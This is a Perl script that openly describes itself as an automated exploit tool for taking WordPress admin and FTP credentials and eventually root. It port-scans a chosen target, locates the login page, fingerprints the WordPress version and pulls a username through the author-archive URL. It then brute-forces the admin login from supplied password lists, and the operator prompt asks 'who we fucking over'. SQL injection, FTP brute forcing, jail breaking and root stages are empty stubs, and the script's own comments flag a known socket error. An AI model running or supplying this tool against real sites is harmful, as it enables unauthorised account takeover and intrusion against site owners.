#!/usr/bin/perl

########
#
# Automated exploit tool for getting WordPress admin credentials and FTP credentials and eventually... root
#
########

################Version 1.1###################
#
# Added support for reading user provided lists
#

################Version 1.0###################
#
# Currently works with basic information gathering and basic brute forcing
#



############################
#Built-in modules
use strict;
use warnings;
use LWP::UserAgent ();
use Net::FTP;
use IO::Socket::INET;
use Net::IP;
use HTTP::Request;
use HTTP::Request::Common;
use HTTP::Cookies;
use LWP::Protocol::https;
use Term::ANSIColor;
use Net::DNS;
###########################
#External modules (trying to avoid using)
###########################
####
system('clear');
#Static Variables
my @ports = qw(20 21 22 23 53 67 68 69 80 88 135 139 443 445);
my @oports;
my @content;
my $sock;
my $banner = << 'EOL';
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
.___/\          __  .__                  ____.                                                      __    __________._______________________   ___ ___
|   )/_____   _/  |_|  |__   ____       |    |__ __  ____   ____   ___________  ____ _____   __ ___/  |_  \______   \   \__    ___/\_   ___ \ /   |   \
|   |/     \  \   __\  |  \_/ __ \      |    |  |  \/ ___\ / ___\_/ __ \_  __ \/    \\__  \ |  |  \   __\  |    |  _/   | |    |   /    \  \//    ~    \
|   |  Y Y  \  |  | |   Y  \  ___/  /\__|    |  |  / /_/  > /_/  >  ___/|  | \/   |  \/ __ \|  |  /|  |    |    |   \   | |    |   \     \___\    Y    /
|___|__|_|  /  |__| |___|  /\___  > \________|____/\___  /\___  / \___  >__|  |___|  (____  /____/ |__|    |______  /___| |____|    \______  /\___|_  /
          \/             \/     \/                /_____//_____/      \/           \/     \/                      \/                       \/       \/

VERSION 1.1
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
EOL
#####################################
#Bot building
my $cookie = new HTTP::Cookies(ignore_discard => 1);
my $bot = LWP::UserAgent->new;
$bot -> timeout(10);
$bot -> agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");
$bot -> cookie_jar($cookie);
#####################################
print color('bold yellow');
print $banner;
print "\n\n[*]Who we fucking over => ";
print color('bold red');
chomp(my $host = <STDIN>);
print color('bold yellow');
print "\n\n[*]Enter the path to the list of usernames => ";
print color('bold red');
chomp(my $usernames = <STDIN>);
print color('bold yellow');
print "\n\n[*]Enter the path to the list of passwords => ";
print color('bold red');
chomp(my $passwords = <STDIN>);
#####################################
#Reading user provided files and pushing them to gloabl arrays, will add error handling soon
open my $user_handle, '<', $usernames;
chomp(my @users = <$user_handle>);
close $user_handle;

open my $pass_handle, '<', $passwords;
chomp(my @pass = <$pass_handle>);
close $pass_handle;
#####################################
#Running subroutines
port_scanner();
admin_find();
version_find();
user_find();
site_map();
#####################################
#Start subroutine building
####
#Port scanner
sub port_scanner {
  print color('bold yellow');
  print "\n\n++++++++++++++++++++++++++++++\n";
  print "[*]Port scanning $host\n";
  print "++++++++++++++++++++++++++++++\n";
  print color('reset');
  #looks for ports in the array
  foreach my $port (@ports){
      if($sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto => 'tcp', Timeout => 1)){
          print color('bold green');
          print "[*] =>\tPort $port is open\n";
          print color('reset');
          push @oports, $port; #pushing the open port to an array for later use
      }
      else{
        print color('red');
        print "[*] =>\tPort $port is closed\n";
        print color('reset');
    }
  }
}

####
#Finding admin pages
sub admin_find {
 print color('bold yellow');
 print "++++++++++++++++++++++++++++++++++\n";
 print "[*]Hunting for an admin page\n";
 print "++++++++++++++++++++++++++++++++++\n";
 print color('reset');
#array of typical admin pages
  if ($host !~ /http:\/\//) {$host = "http://$host";}; #adds http before the target if it is not present
  my $hunt = $host."/wp-login.php/";
	my $req = HTTP::Request->new(GET=>$hunt); #sends a GET request for the pages
	my $res = $bot->request($req);
   #looks for the admin page
  if ($res->is_success) {
     print color('bold green');
	   print "[*]Found the admin page!!\n";
	   print "[*] =>\t$hunt \n";
     print color('reset');
   }
	 elsif ($res->content=~/Access Denied/){ #if the admin page is found, but pulls a 403 error, will let the user know
     print color('bold green');
     print "[*]Found the admin page : $hunt => [Error & Access Denied]\n";
     print color('reset');
    }
	 else {
     print color('red');
     print "[*]Unable to find an admin page\n";
     print color('reset');
	  }
  }

####
#WordPress user discovery
sub user_find {
  print color('bold yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Looking for a user\n";
  print "++++++++++++++++++++++++++++++++++\n";
  print color('reset');
  my $user = $host . '/?author=1'; #the /?author=1 will lead to a public facing list of users
  my $req = HTTP::Request ->new(GET=>$user); #build a request to get page content
  my $userhunt = $bot->request($req)->content; #sends the request then decodes the content so it doesn't load a hash
  if($userhunt =~/<title>([a-zA-Z\/][^>]+)<\/title>/){ #filtering for the username in the pages title
    my $victim = $1; #grabs the content between the <title> tags
    print color('bold green');
    print "[*]Found user\n";
    print "[*] =>\t$victim \n";
    print color('reset');
    brute_force($victim); #sends the $victim data for brute forcing
  }
  else{
    print color('red');
    print "[*]Unable to find a user\n[*]Using user provided username list\n"; #needs to be built out
    print color('reset');
  }
}

####
#Version discovery
sub version_find {
  print color('bold yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Looking for WordPress Version\n";
  print "++++++++++++++++++++++++++++++++++\n";
  print color('reset');
  my $req = HTTP::Request -> new(GET=>$host);
  my $versionfind = $bot ->request($req)->content;
  if($versionfind =~ /content="WordPress(.*?)"/){
    my $version = $1;
    print color('bold green');
    print "[*]Found version\n";
    print "[*] =>\t$version \n";
    print color('reset');
  }
  else {
    print color('red');
    print "[*]Unable to determine the WordPress Version\n";
    print color('reset');
  }
}

####
#Admin Page Brute force
sub brute_force {
  my $victim = shift; #Sets the variable up allow input
  print color('bold yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Trying to break the Admin login\n";
  print "++++++++++++++++++++++++++++++++++\n";
  print color('reset');
  #Iterating through the array to try and guess the password
  #Attempts to find a redirect between the login script and the actual admin page
  foreach (@pass) {
      chomp(my $passwd = $_);
        my $target = $host . '/wp-login.php';
        my $auth = $host . '/wp-admin/';
        my $login = POST $target,[log => $victim, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth]; #builds a POST request for the login page
        my $attempt = $bot->request($login); #sends the actual request
        my $status = $attempt-> as_string; #Converts the data from the HASH that the request sends to a STRING
        if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){ #checks if the redirect has occurred
          print color('bold green');
          print "[*]Broke the site!\n";
          print "[*] =>\t$victim \n";
          print "[*] =>\t$passwd \n";
          print color('reset');
      }
    }
  }

####
#Site mapping
#Will work with the SQL Injection... eventually
sub site_map{
  print color('bold yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Looking for pages with potential vulns\n";
  print "++++++++++++++++++++++++++++++++++\n";
  print color('reset');
  my $buffer; #variable used to temporarily store socket requests
  my @get; #array for pages that have GET parameters
  my $server = 0; #Used for testing the server type
  $sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => '80' ,Proto => 'tcp', Timeout => 1);

  #Sending a request to the server
  #Has to be adjusted, causes an error: "Can't call method "send" on an undefined value"
  $sock->send("HEAD / HTTP/1.1\r\n");
  $sock->send("\r\n");
  $sock->send("\r\n");
  $sock->recv($buffer, 2048);


  my @buffer = split("\n",$buffer); #split the data in the $buffer variable by newline characters and saves it to an array

  foreach (@buffer){
    if(m/^Server:(.*)/i){
      print "Web server is: $1 \n";
      $server++
    }
  }
  if($server) {
    foreach ("html", "htm", "php", "asp", "aspx", "txt") {
      if(page("index"."$_")){
        print "page: index $_ \n";
        foreach (@content){
          print "File: $2 \n" if(m/<a.*href=("|")([^"']+)("|')/);
        }
        last;
      }
    }
  }
  #Nested function
  sub page {
    my $res = $bot -> get($host.":80"."/".$_[0]);
    if ($res -> is_success){
      @content = split(/\015?\012/,$res->content); #\015 = ^M \012 = ^J
      return $_[0];
    }
    return;
  }
  END {
    $sock->close() if $sock;
  }
}






####
#SQL Injection
sub sql{}

####
#FTP brute forcing
sub ftp_brute {
  print color('bold yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Trying to break the FTP login\n";
  print "++++++++++++++++++++++++++++++++++\n";
  print color('reset');

}

####
#FTP commands
sub ftp {}

####
#FTP CHROOT jail breaking
sub jail_break{}

####
#Get root
sub get_root{}

###############################################
